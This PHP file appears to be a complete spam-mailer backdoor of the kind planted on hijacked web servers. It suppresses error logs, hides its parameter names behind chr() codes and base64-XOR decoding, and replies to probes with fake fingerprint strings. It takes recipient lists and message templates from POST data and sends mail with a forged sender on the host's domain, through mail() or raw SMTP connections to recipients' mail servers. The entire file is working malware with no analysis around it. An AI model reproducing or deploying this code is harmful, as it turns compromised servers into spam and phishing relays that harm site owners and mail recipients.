<?
@error_reporting(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
if (count($_POST) < 2) {
    die("Linux10+cfcd208495d565ef66e7dff9f98764da");
    // die(PHP_OS.chr(49).chr(48).chr(43).md5(0987654321));
}
$var1 = false;
foreach(array_keys($_POST) as $item) {
    switch ($item[0]) {
    case chr(108):
        $var2 = $item;
        break;
    case chr(100):
        $var3 = $item;
        break;
    case chr(109):
        $hostname = $item;
        break;
    case chr(101);
        $var1 = true;
        break;
    }
}
if ($var2 === '' || $var3 === '') {
        die("Linux10+cfcd208495d565ef66e7dff9f98764da");
    // die(PHP_OS.chr(49).chr(49).chr(43).md5(0987654321));
}
$var4 = preg_split('/\,(\ +)?/', @ini_get('disable_functions'));
$var5 = @$_POST[$var2];
$var3 = @$_POST[$var3];
$hostname = @$_POST[$hostname];
if ($var1) {
    $var5 = func1($var5);
    $var3 = func1($var3);
    $hostname = func1($hostname);
}
$var5 = urldecode(stripslashes($var5));
$var3 = urldecode(stripslashes($var3));
$hostname = urldecode(stripslashes($hostname));
if (strpos($var5, '#',1) != false) {
    $var7 = preg_split('/#/', $var5);
    $var8 = count($var7);
} else {
    $var7[0] = $var5;
    $var8 = 1;
}
for ($var9=0; $var9 < $var8; $var9++) {
    $var5 = $var7[$var9];
    if ($var5 == '' || !strpos($var5,'@',1)) {
        continue;
    }
    if (strpos($var5, ';', 1) != false) {
        list($var10, $var11, $var12) = preg_split('/;/',strtolower($var5));
        $var10 = ucfirst($var10);
        $var11 = ucfirst($var11);
        $var13 = next(explode('@', $var12));
        if ($var11 == '' || $var10 == '') {
            $var11 = $var10 = '';
            $var5 = $var12;
        } else {
            $var5 = "\"$var10 $var11\" <$var12>";
        }
    } else {
        $var11 = $var10 = '';
        $var12 = strtolower($var5);
        $var13 = next(explode('@', $var5));
    }
    preg_match('|<USER>(.*)</USER>|imsU', $var3, $mail_user);
    $mail_user = $mail_user[1];
    preg_match('|<NAME>(.*)</NAME>|imsU', $var3, $var15);
    $var15 = $var15[1];
    preg_match('|<SUBJ>(.*)</SUBJ>|imsU', $var3, $var16);
    $var16 = $var16[1];
    preg_match('|<SBODY>(.*)</SBODY>|imsU', $var3, $var17);
    $var17= $var17[1];
    $var16 = str_replace("%R_NAME%", $var10, $var16);
    $var16 = str_replace("%R_LNAME%", $var11, $var16);
    $var17 = str_replace("%R_NAME%", $var10, $var17);
    $var17 = str_replace("%R_LNAME%", $var11, $var17);
    $mail_domain = preg_replace('/^(www|ftp)\./i', '', @$_SERVER['HTTP_HOST']);
    if (func2($mail_domain) || @ini_get('safe_mode')) {
        $var20 = false;
    } else {
        $var20 = true;
    }
    $mail_addr = "$mail_user@$mail_domain";
    if ($var15 != '') {
        $from = "$var15 <$mail_addr>";
    } else {
        $from = $mail_addr;
    }
    $from_line = "From: $from\r\n";
    $from_line .= "Reply-To: $from\r\n";
    $header = "X-Priority: 3 (Normal)\r\n";
    $header .= "MIME-Version: 1.0\r\n";
    $header .= "Content-Type: text/html; charset=\"iso-8859-1\"\r\n";
    $header .= "Content-Transfer-Encoding: 8bit\r\n";
    if (!in_array('mail', $var4)) {
        if ($var20) {
            if (@mail($var5, $var16, $var17, $from_line.$header, "-f$mail_addr")) {
                echo("OKe807f1fcf82d132f9bb018ca6738a19f+0");
                // echo(chr(79).chr(75).md5(1234567890)."+0\n");
                continue;
            }
        } else {
            if (@mail($var5, $var16, $var17, $header)) {
                echo("OKe807f1fcf82d132f9bb018ca6738a19f+0");
                // echo(chr(79).chr(75).md5(1234567890)."+0\n");
                continue;
            }
        }
    }
    $message = "Date: " . @date("D, j M Y G:i:s O")."\r\n" . $from_line;
    $message .= "Message-ID: <".preg_replace('/(.{7})(.{5})(.{2}).*/', '--', md5(time()))."@$mail_domain>\r\n";
    $message .= "To: $var5\r\n";
    $message .= "Subject: $var16\r\n";
    $message .= $header;
    $full_message = $message."\r\n".$var17;
    if ($hostname == '') {
        $hostname = func3($var13);
    }
    if (($var24 = func4($mail_addr, $var12, $full_message, $mail_domain, $hostname)) == 0) {
        echo("OKe807f1fcf82d132f9bb018ca6738a19f+1 ");
        // echo(chr(79).chr(75).md5(1234567890)."+1\n");
        continue;
    } else {
        echo "Linux20+cfcd208495d565ef66e7dff9f98764da"."+$var24\n";
        echo PHP_OS.chr(50).chr(48).'+'.md5(0987654321)."+$var24\n";
    }
}
function func2($var25){
    return preg_match("/^([1-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])(\.([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])){3}$/", $var25);
}
function func5($var26, $var27 = 0, $var28="=\r\n", $var29 = 0, $var30 = false) {
    $var31 = strlen($var26);
    $var24 = '';
    for ($var9 = 0; $var9 < $var31; $var9++) {
        if ($var27 >= 75) {
            $var27 = $var29;
            $var24 .= $var28;
        }
        $var32 = ord($var26[$var9]);
        if (($var32 == 0x3d) || ($var32 >= 0x80) || ($var32 < 0x20)) {
            if ((($var32 == 0x0A) || ($var32 == 0x0D)) && (!$var30)) {
                $var24.=chr($var32);
                $var27 = 0;
                continue;
            }
            $var24 .='='.str_pad(strtoupper(dechex($var32)), 2, '0', STR_PAD_LEFT);
            $var27 += 3;
            continue;
        }
        $var24 .= chr($var32);
        $var27++;
    }
    return $var24;
}
function func4($from, $var5, $full_message, $mail_domain, $hostname) {
    global $var4;
    if (!in_array('fsockopen', $var4)) {
        $sock_handle = @fsockopen($hostname, 25, $var33, $var34, 20);
    } else if (!in_array('pfsockopen', $var4)) {
        $sock_handle = @pfsockopen($hostname, 25, $var33, $var34, 20);
    } else if (!in_array('stream_socket_client', $var4) && function_exists("stream_socket_client")) {
        $sock_handle = @stream_socket_client("tcp://$hostname:25", $var33, $var34, 20);
    } else {
        return -1;
    }
    if (!$sock_handle) {
        return 1;
    } else {
        $var3 = func6($sock_handle);
        @fputs($sock_handle, "EHLO $mail_domain\r\n");
        $var35 = func6($sock_handle);
        if (substr($var35, 0, 3) != 250 ) {
            return "2+($var5)+".preg_replace('/(\r\n|\r|\n)/', '|', $var35);
        }
        @fputs($sock_handle, "MAIL FROM:<$from>\r\n");
        $var35 = func6($sock_handle);
        if (substr($var35, 0, 3) != 250 ) {
            return "3+($var5)+".preg_replace('/(\r\n|\r|\n)/', '|', $var35);
        }
        @fputs($sock_handle, "RCPT TO:<$var5>\r\n");
        $var35 = func6($sock_handle);
        if (substr($var35, 0, 3) != 250 && substr($var35, 0, 3) != 251) {
            return "4+($var5)+".preg_replace('/(\r\n|\r|\n)/', '|', $var35);
        }
        @fputs($sock_handle, "DATA\r\n");
        $var35 = func6($sock_handle);
        if (substr($var35, 0, 3) != 354 ) {
            return "5+($var5)+".preg_replace('/(\r\n|\r|\n)/', '|', $var35);
        }
        @fputs($sock_handle, $full_message."\r\n.\r\n");
        $var35 = func6($sock_handle);
        if (substr($var35, 0, 3) != 250 ) {
            return "6+($var5)+".preg_replace('/(\r\n|\r|\n)/', '|', $var35);
        }
        @fputs($sock_handle, "QUIT\r\n");
        @fclose($sock_handle);
        return 0;
    }
}
function func6($sock_handle) {
    $var3 = '';
    while ($var36 = @fgets($sock_handle, 4096)) {
        $var3 .= $var36;
        if (substr($var36, 3, 1) == ' ') {
            break;
        }
    }
    return $var3;
}
function func3($var37) {
    global $var4;
    if (!in_array('getmxrr', $var4) && function_exists("getmxrr")) {
        @getmxrr($var37, $var38, $var39);
        if (count($var38) === 0) {
            return '127.0.0.1';
        }
        $var9 = array_keys($var39, min($var39));
        return $var38[$var9[0]];
    } else {
        return '127.0.0.1';
    }
}
function func1($arg) {
    $arg = base64_decode($arg);
    $result = '';
    for ($var9 = 0; $var9 < strlen($arg); $var9++) {
        $result .= chr(ord($arg[$var9]) ^ 2);
    }
    return $result;
}
?>